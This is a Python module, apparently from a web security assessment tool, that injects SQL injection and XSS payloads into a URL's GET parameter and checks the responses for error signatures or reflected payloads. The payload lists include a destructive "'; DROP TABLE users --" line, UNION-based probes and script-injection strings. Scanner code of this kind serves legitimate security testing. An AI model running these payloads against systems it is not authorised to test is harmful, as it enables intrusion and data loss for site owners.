"""
payload_engine.py — Injection Assessment Module
=================================================
Extracts injectable parameters from a target URL, injects SQLi and XSS
test payloads, sends each modified request, and checks responses for
vulnerability signatures.

Layer  : Processing Layer
"""

import time
import logging
from typing import List, Dict, Tuple, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  [PAYLOAD]  %(levelname)s  %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("payload_engine")

# ─────────────────────────────────────────────────────────────
# Payload libraries
# ─────────────────────────────────────────────────────────────

SQLI_PAYLOADS: List[str] = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1 --",
    "1' ORDER BY 2 --",
    "1 UNION SELECT NULL --",
    "1 UNION SELECT NULL, NULL --",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --",
    ";SELECT 1",
    "'; DROP TABLE users --",
    "'; WAITFOR DELAY '0:0:0' --",
    "' || '1'='1",
    "' || 1=1 --",
    "a' OR 'a'='a",
    "1;SELECT pg_sleep(0)",
    "ORA-00933",
]

XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x OnErRoR=alert(1)>",
    "javascript:alert(1)",
    "<a href='javascript:alert(1)'>click</a>",
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<object data='javascript:alert(1)'></object>",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "<select onchange=alert(1)><option>1</option></select>",
    "<details open ontoggle=alert(1)>x</details>",
    "'-alert(1)-'",
]

SQLI_ERROR_SIGNATURES: List[str] = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "supplied argument is not a valid mysql",
    "pg_query()",
    "pg_exec()",
    "postgresql query failed",
    "pgsql error",
    "sqlite error",
    "sqlite3.operationalerror",
    "sqlite_master",
    "microsoft ole db provider for sql server",
    "microsoft odbc sql server driver",
    "[sql server]",
    "unclosed quotation mark after the character string",
    "incorrect syntax near",
    "oracle error",
    "ora-",
    "oracle odbc",
    "quoted string not properly terminated",
    "sql syntax",
    "database error",
    "db error",
    "sqlexception",
    "invalid query",
    "unterminated string",
]

DEFAULT_TIMEOUT      = 8
DEFAULT_DELAY        = 0.2
DEFAULT_MAX_PAYLOADS = 20
DEFAULT_USER_AGENT   = "AegisSecurity/1.0 Web Application Assessment"


# ─────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────

def _build_injected_url(base_url: str, param: str, payload: str) -> str:
    parsed     = urlparse(base_url)
    params     = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query  = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _check_sqli_response(body: str) -> Tuple[bool, str]:
    body_lower = body.lower()
    for sig in SQLI_ERROR_SIGNATURES:
        if sig.lower() in body_lower:
            return True, sig
    return False, ""


def _check_xss_response(body: str, payload: str) -> Tuple[bool, str]:
    if payload in body:
        idx   = body.find(payload)
        start = max(0, idx - 20)
        return True, body[start: idx + len(payload) + 20][:100]
    if payload.lower() in body.lower():
        idx   = body.lower().find(payload.lower())
        start = max(0, idx - 20)
        return True, body[start: idx + len(payload) + 20][:100]
    return False, ""


# ─────────────────────────────────────────────────────────────
# PayloadEngine
# ─────────────────────────────────────────────────────────────

class PayloadEngine:
    """
    GET-parameter injection assessment engine.

    Extracts query parameters from a URL, injects SQLi/XSS test payloads,
    sends each modified request, and checks responses for vulnerability
    indicators.

    Parameters
    ----------
    payload_type : "sqli" | "xss" | "both"
    max_payloads : int   — maximum number of payloads to test
    timeout      : int   — per-request HTTP timeout (seconds)
    delay        : float — polite pause between requests (seconds)
    """

    def __init__(
        self,
        payload_type: str   = "both",
        max_payloads: int   = DEFAULT_MAX_PAYLOADS,
        timeout:      int   = DEFAULT_TIMEOUT,
        delay:        float = DEFAULT_DELAY,
        user_agent:   str   = DEFAULT_USER_AGENT,
    ):
        self.payload_type = payload_type
        self.max_payloads = max_payloads
        self.timeout      = timeout
        self.delay        = delay
        self.user_agent   = user_agent

        self._session = requests.Session()
        self._session.headers.update({"User-Agent": self.user_agent})

    def _get_payloads(self) -> List[Dict]:
        combined: List[Dict] = []
        if self.payload_type in ("sqli", "both"):
            combined += [{"payload": p, "type": "sqli"} for p in SQLI_PAYLOADS]
        if self.payload_type in ("xss", "both"):
            combined += [{"payload": p, "type": "xss"} for p in XSS_PAYLOADS]
        return combined[: self.max_payloads]

    def _test_single(
        self, url: str, param: str, payload: str, ptype: str
    ) -> Dict:
        injected_url = _build_injected_url(url, param, payload)
        result: Dict = {
            "url":         injected_url,
            "param":       param,
            "payload":     payload,
            "type":        ptype,
            "status":      "clean",
            "status_code": None,
            "evidence":    "",
        }
        try:
            response = self._session.get(
                injected_url,
                timeout=self.timeout,
                allow_redirects=True,
                verify=True,
            )
            result["status_code"] = response.status_code
            vuln, evidence = (
                _check_sqli_response(response.text)
                if ptype == "sqli"
                else _check_xss_response(response.text, payload)
            )
            if vuln:
                result["status"]   = "vulnerable"
                result["evidence"] = evidence
                logger.warning(
                    "POTENTIAL FINDING [%s] param=%s url=%s",
                    ptype.upper(), param, injected_url
                )
        except requests.exceptions.Timeout:
            result["status"] = "error"
        except requests.exceptions.RequestException:
            result["status"] = "error"
        return result

    def inject(self, target_url: str) -> Dict:
        """
        Run all configured payloads against the first GET parameter found
        in *target_url*.

        If the URL has no query parameters, a synthetic ``input`` parameter
        is appended before testing begins.

        Returns
        -------
        dict with keys:
            target_url, params_found, results,
            total_tested, total_vulnerable, total_clean,
            total_errors, payload_type
        """
        payloads = self._get_payloads()

        parsed = urlparse(target_url)
        qs     = parse_qs(parsed.query, keep_blank_values=True)
        params = list(qs.keys())

        if not params:
            sep         = "&" if parsed.query else "?"
            target_url += f"{sep}input=test"
            parsed      = urlparse(target_url)
            params      = list(parse_qs(parsed.query).keys())

        test_param = params[0]
        logger.info(
            "Assessment started  param=%s  payloads=%d  url=%s",
            test_param, len(payloads), target_url
        )

        results: List[Dict] = []
        for item in payloads:
            results.append(
                self._test_single(target_url, test_param, item["payload"], item["type"])
            )
            time.sleep(self.delay)

        return {
            "target_url"      : target_url,
            "params_found"    : params,
            "results"         : results,
            "total_tested"    : len(results),
            "total_vulnerable": sum(1 for r in results if r["status"] == "vulnerable"),
            "total_clean"     : sum(1 for r in results if r["status"] == "clean"),
            "total_errors"    : sum(1 for r in results if r["status"] == "error"),
            "payload_type"    : self.payload_type,
        }